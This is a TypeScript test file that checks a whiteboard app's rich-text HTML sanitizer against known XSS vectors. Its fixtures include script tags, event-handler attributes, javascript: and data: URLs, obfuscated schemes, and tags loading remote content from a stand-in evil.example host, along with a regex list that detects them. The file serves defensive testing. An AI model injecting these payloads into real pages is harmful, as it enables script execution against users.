/**
 * XSS-resistance fixtures for the canvas rich-text sanitizer.
 *
 * The sanitizer at src/lib/utils/safe-html.ts is the sole barrier
 * protecting the canvas whiteboard from script execution via user-
 * authored HTML. Realtime peer writes bypass the local editor and land
 * directly in the renderer's `dangerouslySetInnerHTML`, so any
 * regression here is exploitable by anyone who can post a board
 * object — including squad guests.
 *
 * Each test asserts a specific neutralisation property of a known XSS
 * vector. Add a new test ANY time:
 *   - A new attack vector is reported (CVE, bug bounty, fuzz find)
 *   - DOMPurify is upgraded (re-run the suite against the new version)
 *   - The ALLOWED_TAGS / ALLOWED_ATTR allowlist changes
 *
 * NB: jsdom's HTML parser differs subtly from browsers (especially on
 * SVG / namespaced elements). A passing test here is necessary but not
 * sufficient — pair with a real-browser XSS regression run before
 * shipping sanitizer changes.
 */

import { describe, it, expect } from "vitest";
import { sanitizeRichHtml, isRichHtmlEmpty } from "@/lib/utils/safe-html";

/** Asserts the sanitized output cannot execute the payload in any
 *  reasonable browser. Specifically: no <script>, no on* handlers,
 *  no javascript:/data:/vbscript: URLs, no <iframe>, no <object>,
 *  no <embed>, no <svg>, no <style>, no <link>, no <meta>, no <form>. */
function expectNeutralised(html: string): void {
  const clean = sanitizeRichHtml(html);
  expect(clean).not.toMatch(/<script/i);
  expect(clean).not.toMatch(/\son\w+\s*=/i); // any onX= event handler
  expect(clean).not.toMatch(/javascript:/i);
  expect(clean).not.toMatch(/vbscript:/i);
  expect(clean).not.toMatch(/data:text\/html/i);
  expect(clean).not.toMatch(/<iframe/i);
  expect(clean).not.toMatch(/<object/i);
  expect(clean).not.toMatch(/<embed/i);
  expect(clean).not.toMatch(/<svg/i);
  expect(clean).not.toMatch(/<style/i);
  expect(clean).not.toMatch(/<link/i);
  expect(clean).not.toMatch(/<meta/i);
  expect(clean).not.toMatch(/<form/i);
  expect(clean).not.toMatch(/<input/i);
  expect(clean).not.toMatch(/<base/i);
}

describe("sanitizeRichHtml — script injection", () => {
  it("strips a bare <script> tag", () => {
    expectNeutralised("<script>alert(1)</script>");
  });
  it("strips mixed-case <ScRiPt>", () => {
    expectNeutralised("<ScRiPt>alert(1)</ScRiPt>");
  });
  it("strips nested <script> inside <p>", () => {
    expectNeutralised("<p>hello<script>alert(1)</script>world</p>");
  });
  it("strips <script> with attributes", () => {
    expectNeutralised('<script type="text/javascript">alert(1)</script>');
  });
  it("strips <script> with src", () => {
    expectNeutralised('<script src="https://evil.example/x.js"></script>');
  });
});

describe("sanitizeRichHtml — event-handler attributes", () => {
  it("strips onclick on a paragraph", () => {
    expectNeutralised('<p onclick="alert(1)">click me</p>');
  });
  it("strips onload on body-shaped tags", () => {
    expectNeutralised('<body onload="alert(1)"><p>hi</p></body>');
  });
  it("strips onerror on an anchor (since SVG/img are themselves stripped)", () => {
    expectNeutralised('<a href="https://example.com" onerror="alert(1)">link</a>');
  });
  it("strips onmouseover with single quotes", () => {
    expectNeutralised("<p onmouseover='alert(1)'>x</p>");
  });
  it("strips onfocus on a presumed <input> (input itself also stripped)", () => {
    expectNeutralised('<input onfocus="alert(1)" autofocus />');
  });
});

describe("sanitizeRichHtml — URL hardening on <a>", () => {
  it("removes a javascript: href", () => {
    const out = sanitizeRichHtml('<a href="javascript:alert(1)">x</a>');
    expect(out).not.toMatch(/javascript:/i);
    // The <a> tag may survive without an href; text content stays.
    expect(out).toContain("x");
  });
  it("removes a vbscript: href", () => {
    expectNeutralised('<a href="vbscript:msgbox(1)">x</a>');
  });
  it("removes a data:text/html href", () => {
    expectNeutralised('<a href="data:text/html,<script>alert(1)</script>">x</a>');
  });
  it("preserves an https: href and adds rel/target hardening", () => {
    const out = sanitizeRichHtml('<a href="https://example.com">x</a>');
    expect(out).toMatch(/href="https:\/\/example\.com"/);
    expect(out).toMatch(/rel="noopener noreferrer"/);
    expect(out).toMatch(/target="_blank"/);
  });
  it("preserves an http: href", () => {
    const out = sanitizeRichHtml('<a href="http://example.com">x</a>');
    expect(out).toMatch(/href="http:\/\/example\.com"/);
  });
  it("preserves a mailto: href", () => {
    const out = sanitizeRichHtml('<a href="mailto:hi@example.com">x</a>');
    expect(out).toMatch(/href="mailto:hi@example\.com"/);
  });
  it("strips an ftp: href as non-allowlisted", () => {
    const out = sanitizeRichHtml('<a href="ftp://files.example.com/x">x</a>');
    expect(out).not.toMatch(/href="ftp:/);
  });
});

describe("sanitizeRichHtml — style + class injection", () => {
  it("strips a style attribute carrying javascript:", () => {
    expectNeutralised('<p style="background:url(javascript:alert(1))">x</p>');
  });
  it("strips a style attribute carrying expression()", () => {
    expectNeutralised('<p style="width:expression(alert(1))">x</p>');
  });
  it("strips a class attribute (no class-based selector poisoning)", () => {
    const out = sanitizeRichHtml('<p class="evil-class">x</p>');
    expect(out).not.toMatch(/class=/);
  });
});

describe("sanitizeRichHtml — foreign / framing tags", () => {
  it("strips <iframe>", () => {
    expectNeutralised('<iframe src="https://evil.example"></iframe>');
  });
  it("strips <object>", () => {
    expectNeutralised('<object data="https://evil.example/x.swf"></object>');
  });
  it("strips <embed>", () => {
    expectNeutralised('<embed src="https://evil.example/x.swf" />');
  });
  it("strips <svg> with onload", () => {
    expectNeutralised('<svg onload="alert(1)"><circle r="10"/></svg>');
  });
  it("strips <meta http-equiv refresh>", () => {
    expectNeutralised('<meta http-equiv="refresh" content="0;url=https://evil.example" />');
  });
  it("strips <base href>", () => {
    expectNeutralised('<base href="https://evil.example/" />');
  });
  it("strips <form action>", () => {
    expectNeutralised('<form action="https://evil.example/submit"><input name="x"/></form>');
  });
  it("strips <link rel=import>", () => {
    expectNeutralised('<link rel="import" href="https://evil.example/x.html" />');
  });
});

describe("sanitizeRichHtml — encoded / obfuscated bypasses", () => {
  it("does not unescape HTML-entity-encoded <script>", () => {
    // The encoded form should pass through as text (visible to the user
    // but inert). Critically, it must NOT decode and execute.
    const out = sanitizeRichHtml("&#60;script&#62;alert(1)&#60;/script&#62;");
    expect(out).not.toMatch(/<script/i);
  });
  it("does not honour a tab-separated javascript: scheme on <a>", () => {
    expectNeutralised('<a href="java\tscript:alert(1)">x</a>');
  });
  it("does not honour a newline-separated javascript: scheme on <a>", () => {
    expectNeutralised('<a href="java\nscript:alert(1)">x</a>');
  });
  it("strips formaction on an injected button (button itself stripped)", () => {
    expectNeutralised('<button formaction="javascript:alert(1)">x</button>');
  });
});

describe("sanitizeRichHtml — allowlisted formatting survives", () => {
  it("preserves <p>, <strong>, <em>", () => {
    const out = sanitizeRichHtml("<p>hello <strong>world</strong> <em>!</em></p>");
    expect(out).toContain("<p>");
    expect(out).toContain("<strong>");
    expect(out).toContain("<em>");
    expect(out).toContain("hello");
    expect(out).toContain("world");
  });
  it("preserves <ul><li>", () => {
    const out = sanitizeRichHtml("<ul><li>a</li><li>b</li></ul>");
    expect(out).toMatch(/<ul>\s*<li>a<\/li>\s*<li>b<\/li>\s*<\/ul>/);
  });
  it("preserves <h1>-<h3> but strips <h4>+", () => {
    const out = sanitizeRichHtml("<h1>a</h1><h2>b</h2><h3>c</h3><h4>d</h4><h5>e</h5>");
    expect(out).toContain("<h1>a</h1>");
    expect(out).toContain("<h2>b</h2>");
    expect(out).toContain("<h3>c</h3>");
    expect(out).not.toMatch(/<h4>/);
    expect(out).not.toMatch(/<h5>/);
  });
  it("preserves <code> + <pre>", () => {
    const out = sanitizeRichHtml("<pre><code>const x = 1;</code></pre>");
    expect(out).toContain("<pre>");
    expect(out).toContain("<code>");
    expect(out).toContain("const x = 1;");
  });
  it("preserves <blockquote>", () => {
    const out = sanitizeRichHtml("<blockquote>q</blockquote>");
    expect(out).toContain("<blockquote>q</blockquote>");
  });
});

describe("sanitizeRichHtml — degenerate inputs", () => {
  it("returns '' for empty string", () => {
    expect(sanitizeRichHtml("")).toBe("");
  });
  it("returns '' for whitespace-only", () => {
    expect(sanitizeRichHtml("   \n\t")).toBe("");
  });
  // The function declares string-only typing; non-strings come back as
  // the empty string per the runtime guard rather than crashing.
  it("returns '' for non-string input (defensive)", () => {
    // Use unknown cast to exercise the runtime guard branch.
    expect(sanitizeRichHtml(undefined as unknown as string)).toBe("");
    expect(sanitizeRichHtml(null as unknown as string)).toBe("");
    expect(sanitizeRichHtml(42 as unknown as string)).toBe("");
  });
  it("returns '' for tags that sanitize to nothing", () => {
    expect(sanitizeRichHtml("<iframe></iframe>")).toBe("");
  });
});

describe("isRichHtmlEmpty", () => {
  it("treats '' as empty", () => {
    expect(isRichHtmlEmpty("")).toBe(true);
  });
  it("treats only-whitespace as empty", () => {
    expect(isRichHtmlEmpty("   ")).toBe(true);
  });
  it("treats <p></p> as empty", () => {
    expect(isRichHtmlEmpty("<p></p>")).toBe(true);
  });
  it("treats <p>x</p> as non-empty", () => {
    expect(isRichHtmlEmpty("<p>x</p>")).toBe(false);
  });
  it("treats nbsp-only content as empty", () => {
    expect(isRichHtmlEmpty("<p>&nbsp;&nbsp;</p>")).toBe(true);
  });
});
